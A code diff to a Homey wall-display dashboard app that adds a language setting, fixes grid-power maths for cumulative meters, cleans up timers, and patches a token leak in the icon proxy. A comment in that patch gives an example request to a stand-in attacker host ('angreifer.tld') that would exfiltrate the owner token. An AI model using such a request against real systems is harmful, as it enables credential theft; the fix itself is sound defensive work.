@@ -173,6 +173,11 @@ class ShellyWallDisplayApp extends Homey.App {
       if (key === 'displayProfiles' || key === 'defaultProfileDevices' || key === 'enabledDevices') {
         this._buildRelevantDeviceIds();
       }
+      // Sprachwechsel wirkt sich auf jeden gerenderten Text aus — die Clients
+      // holen ihre Einstellungen sonst erst beim 15-Minuten-Reload neu.
+      if (key === 'dashboardLang') {
+        this._broadcastSSE({ type: 'settings.reload' });
+      }
     });
   }
 
@@ -548,6 +553,7 @@ class ShellyWallDisplayApp extends Homey.App {
           headerHidden: this.homey.settings.get('headerHidden') || false,
           searchEnabled: this.homey.settings.get('searchEnabled') === true,
           themeMode: this.homey.settings.get('themeMode') || 'toggle',
+          dashboardLang: this.homey.settings.get('dashboardLang') || 'auto',
           cameraFilterEnabled: this.homey.settings.get('cameraFilterEnabled') === true,
           speakerFilterEnabled: this.homey.settings.get('speakerFilterEnabled') === true,
           thermostatFilterEnabled: this.homey.settings.get('thermostatFilterEnabled') === true,
@@ -583,7 +589,7 @@ class ShellyWallDisplayApp extends Homey.App {
       if (url.pathname === '/api/settings' && req.method === 'POST') {
         const body = await this._readBody(req);
         const { key, value } = JSON.parse(body);
-        const allowed = ['port', 'enabledDevices', 'alarmPin', 'energyEnabled', 'batteryInvertSign', 'tileSize', 'tileHeight', 'enabledFlows', 'homeyToken', 'flowTileWidth', 'flowConfirm', 'flowPosition', 'dashboardTitle', 'fontSize', 'accentColor', 'tileRadius', 'headerHidden', 'viewDefault', 'viewBtnHidden', 'zoneOrder', 'coverFullscreen', 'coverFullscreenDelay', 'defaultProfileZones', 'defaultProfileDevices', 'tileColorMode', 'tileColorOn', 'tileColorOff', 'tileColorFlow', 'bgStyle', 'animMode', 'headerIconStyle', 'weatherEnabled', 'weatherHeaderBtn', 'weatherLat', 'weatherLon', 'weatherCity', 'weatherUnit', 'debugLogging', 'displayProfiles', 'evEnabled', 'evDeviceId', 'evCapabilities', 'evImageData', 'searchEnabled', 'themeMode', 'cameraFilterEnabled', 'speakerFilterEnabled', 'thermostatFilterEnabled', 'lightFilterEnabled', 'blindsFilterEnabled', 'roomFilterEnabled'];
+        const allowed = ['port', 'enabledDevices', 'alarmPin', 'energyEnabled', 'batteryInvertSign', 'tileSize', 'tileHeight', 'enabledFlows', 'homeyToken', 'flowTileWidth', 'flowConfirm', 'flowPosition', 'dashboardTitle', 'fontSize', 'accentColor', 'tileRadius', 'headerHidden', 'viewDefault', 'viewBtnHidden', 'zoneOrder', 'coverFullscreen', 'coverFullscreenDelay', 'defaultProfileZones', 'defaultProfileDevices', 'tileColorMode', 'tileColorOn', 'tileColorOff', 'tileColorFlow', 'bgStyle', 'animMode', 'headerIconStyle', 'weatherEnabled', 'weatherHeaderBtn', 'weatherLat', 'weatherLon', 'weatherCity', 'weatherUnit', 'debugLogging', 'displayProfiles', 'evEnabled', 'evDeviceId', 'evCapabilities', 'evImageData', 'searchEnabled', 'themeMode', 'cameraFilterEnabled', 'speakerFilterEnabled', 'thermostatFilterEnabled', 'lightFilterEnabled', 'blindsFilterEnabled', 'roomFilterEnabled', 'dashboardLang'];
         if (!allowed.includes(key)) {
           res.writeHead(400);
           res.end(JSON.stringify({ error: 'Not allowed' }));
@@ -821,7 +827,14 @@ class ShellyWallDisplayApp extends Homey.App {
           res.writeHead(403); res.end(); return;
         }
         const iconMod = iconParsed.protocol === 'https:' ? require('https') : require('http');
-        const token = await this._getOwnerToken();
+        // Den Owner-Token NUR an die eigene Homey senden. Ohne diese Prüfung könnte
+        // jeder im LAN /api/icon-proxy?url=https://angreifer.tld/ aufrufen und
+        // bekäme den Homey-Owner-Token im Authorization-Header exfiltriert.
+        let iconHostAllowed = false;
+        try {
+          iconHostAllowed = iconParsed.hostname === new URL(this.homeyBaseUrl).hostname;
+        } catch (_) { /* homeyBaseUrl unparsebar → kein Token */ }
+        const token = iconHostAllowed ? await this._getOwnerToken() : null;
         const headers = token ? { Authorization: `Bearer ${token}` } : {};
         iconMod.get(iconParsed.href, { headers }, (iconRes) => {
           res.setHeader('Content-Type', iconRes.headers['content-type'] || 'image/svg+xml');
@@ -1691,6 +1704,7 @@ class ShellyWallDisplayApp extends Homey.App {
 
           result.push({
             id: d.id, name: d.name, type, power, soc,
+            cumulative: en.cumulative === true,
             meterImported, meterExported, available: d.available,
             icon: this._buildIconUrl(d.iconOverride || (d.iconObj ? d.iconObj.url : null)),
           });
@@ -1700,8 +1714,27 @@ class ShellyWallDisplayApp extends Homey.App {
         const sum    = (arr) => arr.reduce((s, d) => s + (d.power || 0), 0);
         const solarW   = Math.round(sum(byType('solar')));
         const batteryW = Math.round(sum(byType('battery')));
-        const gridW    = Math.round(sum(byType('grid')));
         const bats     = byType('battery').filter((d) => d.soc !== null);
+
+        // Cumulative meters (P1 / smart meters with en.cumulative=true) report
+        // measure_power as TOTAL HOME CONSUMPTION — not net grid power.
+        // Per the Homey energy spec, gridW must be derived from the energy balance.
+        // Non-cumulative grid devices (e.g. current clamps without cumulative flag)
+        // do report net grid power via measure_power and are summed directly.
+        const cumulativeGridDevices    = byType('grid').filter((d) =>  d.cumulative);
+        const nonCumulativeGridDevices = byType('grid').filter((d) => !d.cumulative);
+        const cumulativeHomeW = cumulativeGridDevices.length
+          ? Math.round(sum(cumulativeGridDevices))
+          : null;
+        const rawGridW = Math.round(sum(nonCumulativeGridDevices));
+        // If a cumulative meter is present its measure_power IS the home consumption;
+        // derive gridW from the energy balance: grid = home − solar + battery(charging)
+        const gridW = cumulativeHomeW !== null
+          ? cumulativeHomeW - solarW + batteryW
+          : rawGridW;
+        const homeW = cumulativeHomeW !== null
+          ? cumulativeHomeW
+          : Math.round(solarW + rawGridW - batteryW);
 
         res.writeHead(200);
         res.end(JSON.stringify({
@@ -1710,7 +1743,7 @@ class ShellyWallDisplayApp extends Homey.App {
             solarW,
             batteryW,
             gridW,
-            homeW: Math.round(solarW + gridW - batteryW),
+            homeW,
             batterySoc: bats.length
               ? Math.round(bats.reduce((s, d) => s + d.soc, 0) / bats.length)
               : null,
@@ -2264,6 +2297,10 @@ class ShellyWallDisplayApp extends Homey.App {
     if (this._sseHeartbeat)   clearInterval(this._sseHeartbeat);
     if (this._flowCacheTimer)   clearTimeout(this._flowCacheTimer);
     if (this._deviceCacheTimer) clearTimeout(this._deviceCacheTimer);
+    // Pro-Gerät-Debounce-Timer aus _subscribeDeviceCapabilities aufräumen
+    for (const t of Object.values(this._capDebounceTimers || {})) clearTimeout(t);
+    this._capDebounceTimers  = {};
+    this._capDebouncePayload = {};
     if (this.wss)    this.wss.close();
     if (this.server) this.server.close();
   }
